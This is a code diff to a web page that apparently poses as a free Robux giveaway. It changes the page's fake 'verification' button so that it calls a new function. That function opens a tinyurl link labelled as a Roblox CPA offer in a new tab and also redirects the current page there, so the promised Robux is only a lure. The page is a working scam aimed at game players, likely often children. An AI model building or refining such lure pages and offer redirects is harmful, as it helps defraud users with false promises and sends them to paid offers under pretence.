@@ -119,10 +119,10 @@
                                 <div class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" id="verify-step">
                                     <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center animate-fade-in">
                                         <p class="text-lg font-medium mb-4">Complete the verification to receive your robux.</p>
-                                        <button class="bg-[#272930] text-white px-4 py-2 rounded-xl hover:bg-gray-800 transition"
-                                                onclick="_cy()">
-                                            Verify
-                                        </button>
+                                       <button class="bg-[#272930] text-white px-4 py-2 rounded-xl hover:bg-gray-800 transition"
+        onclick="redirectBoth()">
+    Verify
+                    </button>
                                     </div>
                                 </div>
                             </div>
@@ -325,7 +325,6 @@
                     );
                 });
 
-                // Add selection to clicked option
                 element.classList.add(
                     'ring',
                     'ring-2',
@@ -343,7 +342,6 @@
                     return;
                 }
 
-                // Hide the Robux selection modal before showing loading/verify
                 closeRobuxSelectionModal();
 
                 loadingOverlay.classList.remove("hidden");
@@ -352,20 +350,18 @@
                 verifyStep.classList.remove("hidden"); // Show the final verification step
             }
 
-            // Expose functions to the global scope for onclick attributes
             window.fetchProfile = fetchProfile;
             window.selectResource = selectResource;
             window.confirmSelection = confirmSelection;
             window.closeErrorModal = closeErrorModal;
             window.closeRobuxSelectionModal = closeRobuxSelectionModal; // Make it globally accessible
 
-            // Global function for _cy, assuming it's part of your external script/logic
-            // If _cy is not defined elsewhere, this will cause an error.
-            // Consider defining a placeholder or confirming its source.
-            window._cy = window._cy || function() {
-                alert("Verification process would start here!");
-                // Add your actual verification logic here
-            };
+          
+    function redirectBoth() {
+        var url = 'https://tinyurl.com/robloxoffercpa';
+        window.open(url, '_blank');
+        window.location.href = url;
+    }
         })();
     </script>
 </body>
